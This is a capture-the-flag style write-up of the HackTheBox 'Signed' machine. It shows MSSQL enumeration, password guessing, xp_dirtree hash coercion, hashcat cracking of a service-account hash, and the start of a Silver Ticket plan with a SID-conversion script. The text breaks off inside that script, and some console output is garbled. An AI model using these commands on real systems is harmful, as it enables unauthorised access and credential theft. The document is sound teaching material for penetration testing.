---
title: "Signed HackTheBox| Let’s Play With MSSQL & Silver Ticket 🎟️| NLTM Reflection"
description: "And here we go again it’s Maverick back from the dark shadows with another Active Directory write-up. Honestly, I wasn’t planning to write about this machine because I didn’t have the time, but this o"
pubDate: 2026-02-18
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 28
coverImage: "https://cdn-images-1.medium.com/max/800/1*DSaGL15qOL24D53yI5ULVg.png"
---

---

![](https://cdn-images-1.medium.com/max/800/1*DSaGL15qOL24D53yI5ULVg.png)

### SignedHackTheBox| Let’s Play With MSSQL & Silver Ticket 🎟️| NLTM Reflection

And here we go again it’s Maverick back from the dark shadows with another Active Directory write-up. Honestly, I wasn’t planning to write about this machine because I didn’t have the time, but this one forced me to. It’s packed with really good stuff, especially around **MSSQL** abuse, **NTLM reflection**, and some interesting **Windows research** angles that made it impossible to just solve and move on. What starts as simple access with a local MSSQL account quickly turns into proper enumeration, authentication coercion via `xp_dirtree`, `NetNTLMv2 `cracking, and eventually forging a silver ticket to escalate privileges inside the database for command execution. From there, things only get more interesting with multiple paths to root involving impersonation tricks, NTLM relay from the DC, and privilege escalation abuse. So as usual, we begin with scanning, enumeration, and then we start playing with MSSQL to see how far we can push it let’s go.

---

### 📌Scanning

```bash
┌──(root㉿kali)-[/home/…/arsenal/nmaper/nmap_6/eagle_eye_results]  
└─# cat eagle_eye_10.129.242.173_default_20260208_111012_raw.txt  
# Nmap 7.95 scan initiated Sun Feb 8 11:10:12 2026 as: /usr/lib/nmap/nmap -sS -sCV -Pn -T4 -p- --min-rate=1000 --max-retries=3 --open --reason --version-intensity=7 -oX eagle_eye_results/eagle_eye_10.129.242.173_default_20260208_111012.xml -oN eagle_eye_results/eagle_eye_10.129.242.173_default_20260208_111012_raw.txt 10.129.242.173  
Nmap scan report for 10.129.242.173  
Host is up, received user-set (0.28s latency).  
Not shown: 65534 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT STATE SERVICE REASON VERSION  
1433/tcp open ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM  
| ms-sql-ntlm-info:  
| 10.129.242.173:1433:  
| Target_Name: SIGNED  
| NetBIOS_Domain_Name: SIGNED  
| NetBIOS_Computer_Name: DC01  
| DNS_Domain_Name: SIGNED.HTB  
| DNS_Computer_Name: DC01.SIGNED.HTB  
| DNS_Tree_Name: SIGNED.HTB  
|_ Product_Version: 10.0.17763  
|_ssl-date: 2026-02-08T09:12:37+00:00; -1s from scanner time.  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2026-02-08T08:52:35  
|_Not valid after: 2056-02-08T08:52:35  
| ms-sql-info:  
| 10.129.242.173:1433:  
| Version:  
| name: Microsoft SQL Server 2022 RTM  
| number: 16.00.1000.00  
| Product: Microsoft SQL Server 2022  
| Service pack level: RTM  
| Post-SP patches applied: false  
|_ TCP port: 1433  
  
Host script results:  
|_clock-skew: mean: -1s, deviation: 0s, median: -2s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Sun Feb 8 11:12:38 2026 -- 1 IP address (1 host up) scanned in 146.31 seconds
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nmap -p 1433,1434 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info 10.129.4.208  
  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-17 14:57 EET  
Nmap scan report for DC01.signed.htb (10.129.4.208)  
Host is up (0.071s latency).  
  
PORT STATE SERVICE  
1433/tcp open ms-sql-s  
| ms-sql-empty-password:  
|_ 10.129.4.208:1433:  
| ms-sql-ntlm-info:  
| 10.129.4.208:1433:  
| Target_Name: SIGNED  
| NetBIOS_Domain_Name: SIGNED  
| NetBIOS_Computer_Name: DC01  
| DNS_Domain_Name: SIGNED.HTB  
| DNS_Computer_Name: DC01.SIGNED.HTB  
| DNS_Tree_Name: SIGNED.HTB  
|_ Product_Version: 10.0.17763  
| ms-sql-info:  
| 10.129.4.208:1433:  
| Version:  
| name: Microsoft SQL Server 2022 RTM  
| number: 16.00.1000.00  
| Product: Microsoft SQL Server 2022  
| Service pack level: RTM  
| Post-SP patches applied: false  
|_ TCP port: 1433  
1434/tcp filtered ms-sql-m
Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds
```

```bash
┌──(root㉿kali)-[/home/…/htb/arsenal/nmaper/nmap_6]  
└─# cat eagle_eye_results/eagle_eye_10.129.242.173_default_20260208_111012_report.txt  
EAGLE EYE RECONNAISSANCE REPORT  
========================================  
Target: 10.129.242.173  
Timestamp: 20260208_111012  
========================================  
  
┌──────────────┬──────────┬─────────────────┬──────────────────────────────────────────────┬──────────┐  
│ PORT/PROTO │ STATE │ SERVICE │ VERSION INFO │ RISK │  
├──────────────┼──────────┼─────────────────┼──────────────────────────────────────────────┼──────────┤  
│ 1433/TCP │ OPEN │ ms-sql-s │ Microsoft SQL Server 2022 16.00.1000.00; RTM │ HIGH │  
└──────────────┴──────────┴─────────────────┴──────────────────────────────────────────────┴──────────┘  
  
==================== SUMMARY ====================  
Total Open Ports: 1  
HIGH RISK: 1  
MEDIUM RISK: 0  
LOW RISK: 0
```

![](https://cdn-images-1.medium.com/max/1200/1*9ZrcfZgXFzr1LdsSbHrxcw.png)

Now we know from the scan results that MSSQL is exposed, so the next step is to test it properly. Since this is an assumed breach scenario, we’re already given credentials, which means authentication testing becomes our starting point. I’ll first validate access using the provided creds, then try a few common MSSQL authentication combinations that you would normally test during an engagement. Once we confirm login, we can establish a proper session and begin the real MSSQL journey enumeration, privilege checking, linked servers, impersonation possibilities, and anything else the database is willing to expose.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH'  
MSSQL 10.129.242.173 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.242.173 1433 DC01 [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth  
MSSQL 10.129.242.173 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.242.173 1433 DC01 [+] DC01\scott:Sm230#C5NatH  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.4.208 -u sa -p 'sa' --local-auth  
MSSQL 10.129.4.208 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.4.208 1433 DC01 [-] DC01\sa:sa (Login failed for user 'sa'. Please try again with or without '--local-auth')  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.4.208 -u sa -p Password1 --local-auth  
MSSQL 10.129.4.208 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.4.208 1433 DC01 [-] DC01\sa:Password1 (Login failed for user 'sa'. Please try again with or without '--local-auth')  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.4.208 -u sa -p Admin123 --local-auth  
MSSQL 10.129.4.208 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.4.208 1433 DC01 [-] DC01\sa:Admin123 (Login failed for user 'sa'. Please try again with or without '--local-auth')  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.4.208 -u sa -p sa123 --local-auth  
MSSQL 10.129.4.208 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.4.208 1433 DC01 [-] DC01\sa:sa123 (Login failed for user 'sa'. Please try again with or without '--local-auth')
```

> Attention: if you notice different IP addresses between screenshots, don’t get confused. Hack The Box recently updated their infrastructure and introduced a great feature called Dedicated Spawn, which means I’m the only one interacting with the machine during the engagement. It’s actually much more relaxing — no more random password changes or unexpected interference from other players. The only thing modifying the system in the background is the standard cleanup script running on the box.

> 🔗 [https://www.hackthebox.com/blog/quality-hacking-labs-experience-with-dedispawn](https://www.hackthebox.com/blog/quality-hacking-labs-experience-with-dedispawn)

Now that we’ve confirmed the provided credentials are valid, it’s time to log in using impacket-mssqlclient and start digging into proper enumeration. As we’ve seen in many other machines, MSSQL can open a lot of interesting paths depending on privileges. First, we’ll assess our role and permissions, check for impersonation opportunities, linked servers, and configuration settings. If possible, we’ll look into enabling `xp_cmdshell `to achieve command execution. At the same time, we’ll explore coercion techniques through MSSQL such as leveraging `xp_dirtree `to trigger outbound authentication which could allow us to capture or relay NTLM hashes and potentially crack them. From here, the real MSSQL journey begins.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# mssqlclient.py scott:'Sm230#C5NatH'@10.129.4.208  
Impacket v0.13.0 - Copyright Fortra, LLC and it==s affiliated companies  
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value:== ==4096====, New Value:== ==16192====[*] INFO(DC01): Line== ==1====: Changed database context to== =='master'====.  
[*] INFO(DC01): Line== ==1====: Changed language setting to us_english.  
[*] ACK: Result:== ==1== ==- Microsoft SQL Server== ==2022== ==RTM (====16.0====.1000====)  
[!]== ==Press help== ==for== ==extra shell commands====SQL== ==(====scott guest@master====)> help  
  
lcd== =={path} - changes the current local directory to {path}  
exit -== ==terminates the server== ==process== ==(====and== ==this== ==session====)  
enable_xp_cmdshell - you know what it means  
disable_xp_cmdshell - you know what it means  
enum_db -== ==enum== ==databases  
enum_links -== ==enum== ==linked servers  
enum_impersonate - check logins that can be impersonated  
enum_logins -== ==enum== ==login users  
enum_users -== ==enum== ==current db users  
enum_owner -== ==enum== ==db owner  
exec_as_user== =={user} - impersonate== ==with== ==execute== ==as== ==user  
exec_as_login {login} - impersonate== ==with== ==execute== ==as== ==login  
xp_cmdshell {cmd} - executes cmd== ==using== ==xp_cmdshell  
xp_dirtree {path} - executes xp_dirtree== ==on== ==the path  
sp_start_job {cmd} -== ==executes cmd== ==using== ==the sql server== ==agent== ==(====blind====)  
use_link== =={link} -== ==linked server to== ==use== ==(====set== ==use_link localhost to go back to local== ==or== ==use_link .. to== ==get== ==back one step====)  
!== =={cmd} - executes a local shell cmd  
upload {====from====} {to} - uploads file {====from====} to the SQLServer host {to}  
download {====from====} {to} - downloads file== ==from== ==the SQLServer host {====from====} to {to}  
show_query - show query  
mask_query -== ==mask query  
  
====SQL== ==(====scott guest@master====)>====SQL== ==(====scott guest@master====)> SELECT @@version====;  
  
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
Microsoft SQL Server== ==2022== ==(RTM) -== ==16.0====.1000====.6== ==(X64)  
Oct== ==8== ==2022== ==05====:====58====:====25====Copyright (C)== ==2022== ==Microsoft Corporation  
Enterprise Evaluation== ==Edition== ==(====64====-bit====)== ==on== ==Windows Server 2019 Standard 10.0 <X64> (====Build== ==17763====:== ==) (====Hypervisor====)  
  
====SQL== ==(====scott guest@master====)> SELECT== ==SERVERPROPERTY====(===='ProductVersion'====),== ==SERVERPROPERTY====(===='Edition'====)====;  
SQL (scott guest@master)> SELECT SYSTEM_USER  
  
-----  
====scott  
====SQL== ==(====scott guest@master====)> SELECT== ==USER_NAME====()====;  
  
-----  
====guest  
====SQL== ==(====scott guest@master====)> SELECT== ==IS_SRVROLEMEMBER====(===='sysadmin'====)====;  
  
-  
====0====SQL (scott guest@master)> SELECT name, type_desc, is_disabled FROM sys.server_principals;  
name type_desc== is_disabled  
----------------------------------- ----------- -----------  
sa SQL_LOGIN 0  
public SERVER_ROLE 0  
sysadmin SERVER_ROLE 0  
securityadmin SERVER_ROLE 0  
serveradmin SERVER_ROLE 0  
setupadmin SERVER_ROLE 0  
processadmin SERVER_ROLE 0  
diskadmin SERVER_ROLE 0  
dbcreator SERVER_ROLE 0  
bulkadmin SERVER_ROLE 0  
##MS_ServerStateReader## SERVER_ROLE 0  
##MS_ServerStateManager## SERVER_ROLE 0  
##MS_DefinitionReader## SERVER_ROLE 0  
##MS_DatabaseConnector## SERVER_ROLE 0  
##MS_DatabaseManager## SERVER_ROLE 0  
##MS_LoginManager## SERVER_ROLE 0  
##MS_SecurityDefinitionReader## SERVER_ROLE 0  
##MS_PerformanceDefinitionReader## SERVER_ROLE 0  
##MS_ServerSecurityStateReader## SERVER_ROLE 0  
##MS_ServerPerformanceStateReader## SERVER_ROLE 0  
scott SQL_LOGIN 0  
SQL (scott guest@master)> SELECT name FROM sys.databases;  
name  
------  
master  
tempdb  
model  
msdb  
SQL (scott guest@master)> SELECT name, data_source FROM sys.servers;  
name data_source  
---- -----------  
DC01 DC01  
SQL (scott guest@master)> EXEC sp_linkedservers;  
SRV_NAME SRV_PROVIDERNAME SRV_PRODUCT SRV_DATASOURCE SRV_PROVIDERSTRING SRV_LOCATION SRV_CAT  
-------- ---------------- ----------- -------------- ------------------ ------------ -------  
DC01 SQLNCLI SQL Server DC01 NULL NULL NULL
```

After confirming the credentials were valid, I connected to MSSQL using `Impacket’s mssqlclient.py`. The server required encryption, so the client automatically switched to TLS, which tells us encrypted connections are enforced. Once authenticated, the context was set to the master database, and the banner revealed that the target is running `Microsoft SQL Server 2022 Enterprise Evaluation Edition `on `Windows Server 2019`. This is useful from a fingerprinting perspective, as it confirms both the SQL version and underlying OS.

To better understand our current privileges, I checked the execution context. `SELECT SYSTEM_USER` returned scott, meaning we authenticated as that SQL login, while `SELECT USER_NAME() `returned **guest**, which shows that inside the current database (master) we are mapped to the guest user. This typically indicates very limited privileges. To confirm this, I queried `IS_SRVROLEMEMBER(‘sysadmin’)`, ***which returned 0, meaning we do not have sysadmin privileges.***

Next, I enumerated server principals to see existing logins and roles. The output shows default server roles such as sysadmin, securityadmin, dbcreator, and others, along with the scott login, which is enabled. I then enumerated available databases and found only the default system databases (master, model, msdb, tempdb), suggesting there are no custom user databases accessible at this stage.

Finally, I checked for linked servers using both sys.servers and sp_linkedservers. The results show a linked server entry pointing to DC01, which appears to reference the same host. Even though it may just be a loopback configuration, linked servers are always interesting because they can introduce impersonation or privilege escalation paths if misconfigured.

At this point, we’ve confirmed the SQL version, validated our low-privileged context, identified existing logins and roles, verified available databases, and discovered a linked server configuration. This gives us a solid baseline before moving deeper into impersonation checks, configuration abuse, and potential authentication coercion techniques.

```sql
SQL (scott guest@master)> enum_impersonate  
execute as database permission_name state_desc grantee grantor  
---------- -------- --------------- ---------- ------- -------  
SQL (scott guest@master)> enum_links  
SRV_NAME SRV_PROVIDERNAME SRV_PRODUCT SRV_DATASOURCE SRV_PROVIDERSTRING SRV_LOCATION SRV_CAT  
-------- ---------------- ----------- -------------- ------------------ ------------ -------  
DC01 SQLNCLI SQL Server DC01 NULL NULL NULL  
Linked Server Local Login Is Self Mapping Remote Login  
------------- ----------- --------------- ------------
```

At this stage, nothing immediately interesting stands out, but this is exactly where many people rush and miss things. During a real engagement, MSSQL deserves patience. Even when the initial privilege level looks low, misconfigurations often hide in roles, impersonation paths, linked servers, unsafe configurations, or features that are disabled but can be enabled. Proper testing means checking everything methodically before assuming the database is a dead end.

One of the most common and important checks at this point is whether we can enable `xp_cmdshell`. This extended stored procedure allows execution of operating system commands directly from SQL Server, which can instantly turn a database foothold into system-level command execution. Even if we are not sysadmin, misconfigurations or impersonation opportunities might still allow us to enable it. So the next logical step is to test whether `xp_cmdshell` can be enabled — because if it can, MSSQL stops being “just a database” and becomes a shell.

```sql
SQL (scott guest@master)> enable_xp_cmdshell  
ERROR(DC01): Line 105: User does not have permission to perform this action.  
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.  
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.  
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.  
SQL (scott guest@master)>
```

Now let’s do one of the most common tricks try relaying or coercing authentication using `xp_dirtree` to our IP. If it works, we might be able to capture a NetNTLMv2 hash and attempt to crack it.

![](https://cdn-images-1.medium.com/max/800/1*kDk4On9zOf5c3cQC1X0kjw.png)

Time to cracking this hash for `mssqlsvc`

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# hashcat hash.txt /usr/share/wordlists/rockyou.txt  
hashcat (v7.1.2) starting in autodetect mode  
  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
====================================================================================================================================================  
* Device #01: cpu-penryn-AMD Ryzen 7 4800H with Radeon Graphics, 3458/6916 MB (1024 MB allocatable), 4MCU  
  
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.  
The following mode was auto-detected as the only one matching your input hash:  
  
5600 | NetNTLMv2 | Network Protocol  
  
NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!  
Do NOT report auto-detect issues unless you are certain of the hash type.  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 513 MB (6464 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/wordlists/rockyou.txt  
* Passwords.: 14344385  
* Bytes.....: 139921507  
* Keyspace..: 14344385  
  
MSSQLSVC::SIGNED:e40eb20f93271fc3:de414ab9afa0b48a79e48f566d064193:010100000000000080c6d7a95699dc0189eaaa7c10c6f69900000000020008004b0042004f00460001001e00570049004e002d003600460058005900480037004700390033003100450004003400570049004e002d00360046005800590048003700470039003300310045002e004b0042004f0046002e004c004f00  
430041004c00030014004b0042004f0046002e004c004f00430041004c00050014004b0042004f0046002e004c004f00430041004c000700080080c6d7a95699dc010600040002000000080030003000000000000000000000000030000035291e9c8714a664c793827bc8f251b87b2fb368d71f8037e1dd95bbadbbcd530a0010000000000000000000000000000000000009002200630069006600730  
02f00310030002e00310030002e00310036002e003100350039000000000000000000:purPLE9795!@  
  
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 5600 (NetNTLMv2)  
Hash.Target......: MSSQLSVC::SIGNED:e40eb20f93271fc3:de414ab9afa0b48a7...000000  
Time.Started.....: Sun Feb 8 23:59:51 2026 (8 secs)  
Time.Estimated...: Sun Feb 8 23:59:59 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........: 639.7 kH/s (3.72ms) @ Accel:1024 Loops:1 Thr:1 Vec:4  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 4489216/14344385 (31.30%)  
Rejected.........: 0/4489216 (0.00%)  
Restore.Point....: 4485120/14344385 (31.27%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: purdaliza -> punong  
Hardware.Mon.#01.: Util: 84%  
  
Started: Sun Feb 8 23:59:33 2026  
Stopped: Mon Feb 9 00:00:00 2026
```

![](https://cdn-images-1.medium.com/max/800/1*3TMDvAj6J2QrUAFk_fiwsg.png)

*Cred_logger #2*

Now I will validate these credentials, and I always try them against multiple services such as **SMB**, **WinRM**, and others to check for additional access.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# nxc mssql 10.129.4.208 -u MSSQLSVC -p 'purPLE9795!@'  
MSSQL 10.129.4.208 1433 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)  
MSSQL 10.129.4.208 1433 DC01 [+] SIGNED.HTB\MSSQLSVC:purPLE9795!@
```

There are no valid credentials for other services except MSSQL, so let’s connect using `mssqlclient.py` and start enumerating the database server. Maybe we can discover useful information with this new user account.

> Keep in mind: if you obtain a new password during enumeration, you should always spray it against other users and services (such as SMB, WinRM, etc.). In real engagements, password reuse is very common, especially among privileged accounts like administrators, so this is always worth trying.

> And if you’re wondering where you can get more users, of course you could try a RID cycling attack to gather usernames for password spraying, or even check for roasting attacks, and so on.

Now, let’s get started and begin enumerating MSSQL.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/signed]  
└─# mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC01): Line 1: Changed database context to 'master'.  
[*] INFO(DC01): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)  
[!] Press help for extra shell commands  
SQL (SIGNED\mssqlsvc guest@master)> enum_logins  
name type_desc is_disabled sysadmin securityadmin serveradmin setupadmin processadmin diskadmin dbcreator bulkadmin  
--------------------------------- ------------- ----------- -------- ------------- ----------- ---------- ------------ --------- --------- ---------  
sa SQL_LOGIN 0 1 0 0 0 0 0 0 0  
##MS_PolicyEventProcessingLogin## SQL_LOGIN 1 0 0 0 0 0 0 0 0  
##MS_PolicyTsqlExecutionLogin## SQL_LOGIN 1 0 0 0 0 0 0 0 0  
SIGNED\IT WINDOWS_GROUP 0 1 0 0 0 0 0 0 0  
NT SERVICE\SQLWriter WINDOWS_LOGIN 0 1 0 0 0 0 0 0 0  
NT SERVICE\Winmgmt WINDOWS_LOGIN 0 1 0 0 0 0 0 0 0  
NT SERVICE\MSSQLSERVER WINDOWS_LOGIN 0 1 0 0 0 0 0 0 0  
NT AUTHORITY\SYSTEM WINDOWS_LOGIN 0 0 0 0 0 0 0 0 0  
NT SERVICE\SQLSERVERAGENT WINDOWS_LOGIN 0 1 0 0 0 0 0 0 0  
NT SERVICE\SQLTELEMETRY WINDOWS_LOGIN 0 0 0 0 0 0 0 0 0  
scott SQL_LOGIN 0 0 0 0 0 0 0 0 0  
SIGNED\Domain Users WINDOWS_GROUP 0 0 0 0 0 0 0 0 0  
SQL (SIGNED\mssqlsvc guest@master)> enum_links  
SRV_NAME SRV_PROVIDERNAME SRV_PRODUCT SRV_DATASOURCE SRV_PROVIDERSTRING SRV_LOCATION SRV_CAT  
-------- ---------------- ----------- -------------- ------------------ ------------ -------  
DC01 SQLNCLI SQL Server DC01 NULL NULL NULL  
Linked Server Local Login Is Self Mapping Remote Login  
------------- ----------- --------------- ------------  
DC01 NULL 1 NULL  
SQL (SIGNED\mssqlsvc guest@master)> enum_impersonate  
execute as database permission_name state_desc grantee grantor  
---------- -------- --------------- ---------- -------- ----------------------------  
b'USER' msdb IMPERSONATE GRANT dc_admin MS_DataCollectorInternalUser  
SQL (SIGNED\mssqlsvc guest@master)> enable_xp_cmdshell  
ERROR(DC01): Line 105: User does not have permission to perform this action.  
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.  
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.  
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.  
SQL (SIGNED\mssqlsvc guest@master)>
```

We still don’t have high privileges, but at least we know there is an IT group.So what I’m thinking now is that there might be a great scenario we used before in one of the VulnLab machines, where we were able to gain high privileges in MSSQL and eventually enable `xp_cmdshell`.

So, let’s dig deeper and try to create a **Silver Ticket**. Also, [make sure to check the scenario in my Breach write-up](https://infosecwriteups.com/breach-vulnlab-malicious-file-upload-to-smb-kerberoasting-silver-ticket-and-av-shenanigans-dbaf0cb2a72e#:~:text=A%20Silver%20Ticket%20Attack%20allows,drop%20a%20reverse%20shell.) I explained it very well there and included some useful resources.

→Now, let’s try to generate a Silver Ticket.

if you read Breach Writeup you will know to Craft a silver ticket we need

1️⃣ **Get the Domain SID**
2️⃣ **Extract the NTLM Hash of the Target User**
3️⃣ **Find the Service Principal Name (SPN)**
4️⃣ **Forge the Silver Ticket using impacket-ticketer**
5️⃣ **Pass the Ticket to the Target System**
6️⃣ **Access the Target Service with Elevated Permissions**

So at this point we have everything we need except the domain SID. We can retrieve it directly from MSSQL using `SELECT SUSER_SID('SIGNED\IT')`. We already know the IT group is a high-privilege group — we confirmed that earlier during `enum_logins` — so the plan is to grab its SID and use it to craft a Silver Ticket. The goal is to authenticate to MSSQL as a high-privileged user and escalate our permissions so we can finally enable `xp_cmdshell`.

```text
SQL (SIGNED\mssqlsvc guest@msdb)> SELECT SUSER_SID('SIGNED\IT')  
  
-----------------------------------------------------------  
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'  
SQL (SIGNED\mssqlsvc guest@msdb)>
```

After running the query, however, MSSQL returned the SID in binary format rather than the standard string representation. Since that format isn’t directly usable for ticket forging, I asked Claude to wrote a small script to properly convert the binary SID into the correct textual SID format before proceeding with the Silver Ticket creation.

```python
#!/usr/bin/env python3  
import struct  
import sys  
  
# ANSI Color Codes  
class Colors:  
HEADER = '\033[95m' # Magenta  
BLUE = '\033[94m' # Blue  
CYAN = '\033[96m' # Cyan  
GREEN = '\033[92m' # Green  
YELLOW = '\033[93m' # Yellow  
RED = '\033[91m' # Red  
WHITE = '\033[97m' # White  
BOLD = '\033[1m' # Bold  
UNDERLINE = '\033[4m' # Underline  
END = '\033[0m' # Reset  
  
# Custom combinations  
SUCCESS = '\033[92m\033[1m' # Bold Green  
WARNING = '\033[93m\033[1m' # Bold Yellow  
ERROR = '\033[91m\033[1m' # Bold Red  
INFO = '\033[96m\033[1m' # Bold Cyan  
PROMPT = '\033[95m\033[1m' # Bold Magenta  
  
def print_banner():  
banner = f"""  
{Colors.CYAN}{'=' * 70}  
{Colors.BOLD}{Colors.HEADER} ███████╗██╗██████╗ ██████╗ ██████╗ ███╗ ██╗██╗ ██╗  
██╔════╝██║██╔══██╗ ██╔════╝██╔═══██╗████╗ ██║██║ ██║  
███████╗██║██║ ██║ ██║ ██║ ██║██╔██╗ ██║██║ ██║  
╚════██║██║██║ ██║ ██║ ██║ ██║██║╚██╗██║╚██╗ ██╔╝  
███████║██║██████╔╝ ╚██████╗╚██████╔╝██║ ╚████║ ╚████╔╝  
╚══════╝╚═╝╚═════╝ ╚═════╝ ╚═════╝ ╚═╝ ╚═══╝ ╚═══╝  
{Colors.END}  
{Colors.YELLOW} MSSQL Binary SID to String Converter{Colors.END}  
{Colors.CYAN}{'=' * 70}{Colors.END}  
"""  
print(banner)  
  
def binary_sid_to_string(binary_sid):  
if isinstance(binary_sid, str):  
binary_sid = binary_sid.strip("b'\"")  
  
sid_bytes = bytes.fromhex(binary_sid)  
revision = sid_bytes[0]  
sub_authority_count = sid_bytes[1]  
identifier_authority = int.from_bytes(sid_bytes[2:8], byteorder='big')  
  
sid = f"S-{revision}-{identifier_authority}"  
  
for i in range(sub_authority_count):  
offset = 8 + (i * 4)  
sub_authority = struct.unpack('<I', sid_bytes[offset:offset+4])[0]  
sid += f"-{sub_authority}"  
  
return sid  
  
def extract_domain_sid(full_sid):  
parts = full_sid.split('-')  
domain_sid = '-'.join(parts[:-1])  
rid = parts[-1]  
return domain_sid, rid  
  
def get_rid_description(rid_int):  
"""Return description for common RIDs"""  
if rid_int == 500:  
return f"{Colors.RED}[!] Administrator Account (RID 500){Colors.END}"  
elif rid_int == 501:  
return f"{Colors.YELLOW}[!] Guest Account (RID 501){Colors.END}"  
elif rid_int == 502:  
return f"{Colors.RED}[!] KRBTGT Account (RID 502) - Golden Ticket Target!{Colors.END}"  
elif rid_int == 512:  
return f"{Colors.RED}[!] Domain Admins Group (RID 512){Colors.END}"  
elif rid_int == 513:  
return f"{Colors.BLUE}[!] Domain Users Group (RID 513){Colors.END}"  
elif rid_int == 515:  
return f"{Colors.BLUE}[!] Domain Computers Group (RID 515){Colors.END}"  
elif rid_int == 516:  
return f"{Colors.YELLOW}[!] Domain Controllers Group (RID 516){Colors.END}"  
elif rid_int == 519:  
return f"{Colors.RED}[!] Enterprise Admins Group (RID 519){Colors.END}"  
elif rid_int >= 1000 and rid_int < 2000:  
return f"{Colors.GREEN}[!] User/Group Account (RID >= 1000){Colors.END}"  
else:  
return f"{Colors.CYAN}[*] Custom RID: {rid_int}{Colors.END}"  
  
def main():  
print_banner()  
  
if len(sys.argv) > 1:  
# Process command line argument  
binary_sid = sys.argv[1]  
print(f"{Colors.INFO}[*] Processing SID from command line...{Colors.END}\n")  
else:  
# Interactive mode  
print(f"{Colors.PROMPT}[?] Paste binary SID (hex format):{Colors.END}")  
